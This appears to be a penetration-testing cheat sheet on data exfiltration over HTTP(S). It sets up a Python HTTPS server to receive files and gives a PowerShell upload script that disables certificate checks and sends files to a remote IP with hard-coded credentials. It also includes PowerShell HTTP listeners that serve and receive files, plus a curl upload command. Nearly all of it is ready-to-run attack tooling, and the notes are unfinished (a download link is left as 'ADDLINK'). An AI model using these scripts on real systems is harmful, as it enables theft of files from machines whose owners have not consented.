# Exfiltration

## Exfiltration Over HTTP(S)
### The Server - Python

1. Download Python HTTPS Server with Authentication
	
	ADDLINK

2. Create certificate

Create a certificate so you can use SSL

```
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

3. Start the server

Usage:

```
python simple-https-server.py 4433 admin:password
```

### The Client - Powershell

1. Create upload.ps1

```
 add-type @"
 using System.Net;
 using System.Security.Cryptography.X509Certificates;
 public class TrustAllCertsPolicy : ICertificatePolicy {
 public bool CheckValidationResult(
 ServicePoint srvPoint, X509Certificate certificate,
 WebRequest request, int certificateProblem) {
 return true;
 }
 }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

echo "========================================================================"
echo "USAGE: ./upload.ps1 https://domain.com/ username:password file_to_upload"
echo "-"
echo "NOTE: script and file to be uploaded must be in the same directory"
echo "========================================================================"

$url=$args[0]
$auth=$args[1]
$filename=$args[2]

$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($auth))

$WebClient = new-object System.Net.WebClient
$WebClient.Headers.Add("Authorization", "Basic " + $encodedCreds)
$WebClient.Headers.Add("X-Atlassian-Token", "nocheck")
$WebClient.UploadFile($url, (Get-Location).Path + "\" + $filename)
```


2. Upload files to server


`./upload.ps1 <https://ip:port/> <admin:password> <file (in current dir)>`

`./upload.ps1 https://192.168.46.1:4433/ admin:password file_to_upload`


## HTTP Server


```
$port = 8080
$dir = (Get-Location).Path
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://*:$port/")
$listener.Start()

Write-Host "HTTP server started on port $port"
Write-Host "Serving files in directory $dir"

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $request = $context.Request
    $response = $context.Response
    $filename = $request.Url.LocalPath.TrimStart('/')
    $filepath = Join-Path $dir $filename

    if (Test-Path $filepath -PathType Leaf) {
        $bytes = [System.IO.File]::ReadAllBytes($filepath)
        $response.OutputStream.Write($bytes, 0, $bytes.Length)
    } else {
        $response.StatusCode = 404
    }

    $response.Close()
}

$listener.Stop()
```

## HTTP Server with File Upload

```
$port = 8080
$dir = (Get-Location).Path
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://*:$port/")
$listener.Start()

Write-Host "HTTP server started on port $port"
Write-Host "Serving files in directory $dir"

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $request = $context.Request
    $response = $context.Response
    $filename = $request.Url.LocalPath.TrimStart('/')

    if ($request.HttpMethod -eq "GET") {
        # Serve a file
        $filepath = Join-Path $dir $filename

        if (Test-Path $filepath -PathType Leaf) {
            $bytes = [System.IO.File]::ReadAllBytes($filepath)
            $response.OutputStream.Write($bytes, 0, $bytes.Length)
        } else {
            $response.StatusCode = 404
        }

        $response.Close()
    } elseif ($request.HttpMethod -eq "POST") {
        # Receive a file upload
        $inputStream = $request.InputStream
        $filename = [System.IO.Path]::GetFileName($request.RawUrl)
        $filepath = Join-Path $dir $filename

        try {
            $outputStream = [System.IO.File]::Create($filepath)
            $inputStream.CopyTo($outputStream)
            $response.StatusCode = 200
        } catch {
            $response.StatusCode = 500
        } finally {
            $outputStream.Close()
            $response.Close()
        }
    } else {
        $response.StatusCode = 405
        $response.Close()
    }
}

$listener.Stop()
```

**Command to upload**

`curl -X POST -F "file=@./example.txt" http://localhost:8080/`
